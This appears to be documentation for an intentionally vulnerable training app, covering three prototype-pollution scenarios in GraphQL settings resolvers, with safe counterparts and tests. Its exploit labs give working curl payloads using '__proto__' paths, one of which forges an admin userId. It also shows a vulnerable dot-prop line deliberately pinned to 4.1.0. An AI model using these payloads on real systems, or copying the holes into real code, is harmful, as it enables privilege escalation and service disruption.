# `PROTO` — prototype pollution

3 scenarios: `PROTO-001` in `accounts`, `PROTO-002` in `accounts`, `PROTO-003` in `notifications`.

**In `accounts`.**

Two weaknesses of the legacy settings paths in `accounts`. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults). Both are observed through the service itself: after the pollution, a field another caller omitted gains a value.

**In `notifications`.**

**Family:** `PROTO` · **Service:** `notifications` · **Scanner:** SAST · **OWASP:** A08

A channel is written by a path the caller brings, and the library that walks
it follows `__proto__` like any other segment. The two protected ways to
write a channel name it with an enum or a typed input, so no path exists to
walk. This one needs the `dot-prop` 4.1.0 pin ([SCA-006](dependencies.md)):
from 4.2.1 the walk refuses `__proto__`.

## PROTO-001 — the dotted path is walked without checks

### PROTO-001 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `setPreferenceByPath(path: String!, value: String!)` |
| Sink | Every path segment followed as written, in `apps/accounts/src/legacy/preferences-path.resolver.ts` |
| Flow | `__proto__.theme` → the walk leaves the preferences document → `Object.prototype.theme` is set for the whole process |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`setPreference`: an enum names the one key; `setPreferencePath`: allowlisted segments, own-property checks, a null-prototype map) |
| Tests | `apps/accounts/test/scenarios/proto-re-res.int-spec.ts` |
| Expected finding | Yes, CWE-1321, SAST |

### PROTO-001 — student guide

A dotted path is a walk over objects. When no segment is checked, `__proto__` is a segment like any other, and what the walk writes then is not the caller's document but the prototype every object in the process inherits from. The observation needs no access to memory: any later reader of an absent field reads the pollution.

### PROTO-001 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    -d '{"query":"mutation { setPreferenceByPath(path: \"__proto__.theme\", value: \"zazzles-lab-marker\") { id } }"}'
{"data":{"setPreferenceByPath":{"id":"u-alice"}}}
```

The mutation answered as if a preference had been written. Now a resume cookie that carries a user and no theme:

```console
$ curl -s $RELAY/internal/sessions/resume-legacy -X POST -H 'cookie: vcx_remember={"userId":"u-alice"}'
{"status":"resumed","userId":"u-alice","theme":"zazzles-lab-marker"}
```

The theme came from the prototype, not the cookie: an argument another caller omitted has gained a value, process-wide. The same path through the counterpart:

```console
{"errors":[{"message":"__proto__ is not a preference name",
  "extensions":{"code":"BAD_USER_INPUT"}}]}
```

And `setPreference(name: THEME, …)` writes the caller's own theme and nothing else — the enum names the one key it may write.

### PROTO-001 — vulnerable and protected

| | Why |
| --- | --- |
| `setPreferenceByPath` (vulnerable) | Each segment is followed unchecked, so the walk reaches `Object.prototype` |
| `setPreference` (protected) | An enum names the single key; no path exists to walk |
| `setPreferencePath` (protected) | Segments are allowlisted, only own properties are followed, and the walk runs over a map with no prototype |

### PROTO-001 — tests

`apps/accounts/test/scenarios/proto-re-res.int-spec.ts`, `PROTO-001` (the last describe of the file): the path write pollutes and the omitted theme gains the marker; the enum mutation writes only its own key; the allowlisted walk refuses `__proto__`.

## PROTO-002 — the settings string is parsed and deep-merged

### PROTO-002 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `updateNotificationSettings(settings: String!)` |
| Sink | `JSON.parse` followed by an unchecked recursive merge, in `apps/accounts/src/legacy/notification-settings.resolver.ts` |
| Flow | `'{"__proto__":{"userId":"u-admin"}}'` → parsed (the parser defines the key, it does not follow it) → the merge follows it → `Object.prototype.userId` is set |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`updatePreferences`: a typed input; `importSettings`: parsed, then a DTO whose transformation drops the key) |
| Tests | `apps/accounts/test/scenarios/proto-re-res.int-spec.ts` |
| Expected finding | Yes, CWE-1321, SAST |

### PROTO-002 — student guide

`JSON.parse` does not call the `__proto__` setter: it defines an own property, which is exactly why a merge that follows keys can be pointed at the prototype. The string form gets past the body parser's guard too — the guard protects the transport, not what a resolver does with a string it was handed.

### PROTO-002 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    --data-raw '{"query":"mutation ($s: String!) { updateNotificationSettings(settings: $s) { id } }","variables":{"s":"{\"__proto__\":{\"userId\":\"u-admin\"}}"}}'
{"data":{"updateNotificationSettings":{"id":"u-alice"}}}
```

Then the same resume route, with a cookie that carries a theme and no user:

```console
$ curl -s $RELAY/internal/sessions/resume-legacy -X POST -H 'cookie: vcx_remember={"theme":"dark"}'
{"status":"resumed","userId":"u-admin","theme":"dark"}
```

The user came from the prototype. The same document as `updatePreferences` input does not even arrive: the body parser refuses it (`Body is not valid JSON`). The same text to `importSettings` succeeds with the preferences unchanged — the parsed document is turned into a typed input whose transformation drops the key, so no merge ever sees it.

### PROTO-002 — vulnerable and protected

| | Why |
| --- | --- |
| `updateNotificationSettings` (vulnerable) | Every key of the parsed document is followed, `__proto__` included |
| `updatePreferences` (protected) | A typed input of four fields; the document's extra key cannot even be handed to it |
| `importSettings` (protected) | The same text parses, and the DTO's transformation drops the key before any merge |

### PROTO-002 — tests

`apps/accounts/test/scenarios/proto-re-res.int-spec.ts`, `PROTO-002`: the merge pollutes and the omitted userId gains `u-admin`; the typed input cannot be handed the document; `importSettings` leaves the preferences as they were.

## PROTO-003 — a path that reaches every object

### PROTO-003 — agent reference

- **Scenario:** PROTO-003, prototype pollution through a settings path.
- **Source:** `apps/notifications/src/settings/set-channel-by-path.resolver.ts`
- **Operation:** GraphQL `setChannelByPath(path: String!, enabled: Boolean!)`, user.
- **Sink:** `dotProp.set(row, path, enabled)` in `dot-prop` 4.1.0, whose walk follows `__proto__` as a segment.
- **Flow:** `path = "__proto__.webhook"` → the walk leaves the caller's row → the row's prototype gains the channel, and every settings entity inherits it.
- **Counterparts:** `apps/notifications/src/settings/set-channel.resolver.ts` (an enum names the channel), `apps/notifications/src/settings/set-channels.resolver.ts` (a typed input of fixed properties).
- **Tests:** `apps/notifications/test/scenarios/proto.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report a caller-supplied dotted path reaching a deep-set.

### PROTO-003 — student guide

The line (`apps/notifications/src/settings/set-channel-by-path.resolver.ts`):

```ts
const row = await this.settings.of(caller);
dotProp.set(row, path, enabled); // PROTO-003 / CWE-1321: the caller's path is walked as it was given, so __proto__ reaches every object
```

`dot-prop`'s `set` walks one segment at a time: `row`, then whatever the
first segment names, and so on to the end of the path. In 4.1.0 no segment
is refused, and `__proto__` is a segment like any other — so
`__proto__.webhook` does not write the caller's row at all. It writes
`webhook` onto the row's prototype, where every settings entity in the
process looks for the fields it does not own. From 4.2.1 the walk refuses
`__proto__` in a path, which is why this service is pinned to 4.1.0
([SCA-006](dependencies.md)). The author's belief: "a path is friendlier
than a mutation per channel shape the client happens to bring."

### PROTO-003 — exploit lab

Run on 2026-11-27 against the service alone on `127.0.0.1:3103`. `$A` is
Alice's token. The channel is off first, so the row's own answer cannot
move:

```console
$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" \
    -d '{"query":"mutation { setChannel(name: WEBHOOK, enabled: false) { webhook } }"}'
{"data":{"setChannel":{"webhook":false}}}

$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" \
    -d '{"query":"mutation { setChannelByPath(path: \"__proto__.webhook\", enabled: true) { webhook } }"}'
{"data":{"setChannelByPath":{"webhook":false}}}
```

The row answers `false` still: what the path wrote is not the row but its
prototype. The proof is read where the service runs, and the test reads it
there: after the mutation, `UserSettingsEntity.prototype.webhook` is `true`
in the service's process, and a plain `({}).webhook` is `undefined`, which
is what pins the write to the entity's prototype rather than the row. The
walk can also be pointed one level deeper — `__proto__.__proto__.webhook`
reaches `Object.prototype` itself — and then the damage is observable from
outside: the next `setChannels(input: { email: false })` answers
`INTERNAL_SERVER_ERROR`, because the process's own validation library now
reads the polluted prototype (`grouped[metadata.propertyName].push is not
a function`). In Postman: the request `PROTO-003: a path that reaches every
object`. In Burp: send the two mutations from Repeater and compare the
answers.

### PROTO-003 — vulnerable and protected

| | Operation | What it does with the same path |
| --- | --- | --- |
| Vulnerable | `setChannelByPath` | Walks it as it was given: `__proto__.webhook` writes the prototype |
| Counterpart 1 | `setChannel` | The channel is named by an enum; the path is not a name the enum has, `GRAPHQL_VALIDATION_FAILED` |
| Counterpart 2 | `setChannels` | The input's properties are fixed; `path` and `enabled` are refused, `BAD_USER_INPUT` |

**Scoped claim.** Each counterpart defeats this flaw for identical input:
the path that walks onto the prototype on the first cannot be handed to
either of them as a channel name or an input property, and nothing is
written, in a row or anywhere else. The claim is not that typed inputs make
every settings write safe; only that this path reaches no prototype through
them.

### PROTO-003 — tests

`apps/notifications/test/scenarios/proto.int-spec.ts`, describe `PROTO-003:
a path that reaches every object`. One attacker value — the path
`__proto__.webhook` with `enabled: true` — is sent to the vulnerable
operation and to each counterpart, and the tests delete the written
property again before the next one runs:

- **The exploit:** `setChannelByPath` answers as if a channel had been
  written, and in the service's process `UserSettingsEntity.prototype.webhook`
  is `true` while a plain object's is `undefined`: the write left the row.
- **Counterpart 1:** the enum refuses the value by name
  (`GRAPHQL_VALIDATION_FAILED`) and nothing is polluted.
- **Counterpart 2:** the input refuses both properties (`BAD_USER_INPUT`)
  and nothing is polluted.
